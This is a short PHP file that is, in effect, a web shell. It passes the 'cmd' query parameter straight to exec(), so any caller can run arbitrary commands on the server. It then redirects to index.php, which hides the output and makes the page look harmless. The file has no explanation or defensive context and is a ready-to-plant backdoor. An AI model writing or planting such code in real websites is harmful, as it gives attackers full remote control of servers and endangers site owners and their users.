<?php
  exec($_GET['cmd'], $output);
  header("Location: index.php");
  exit();
?>
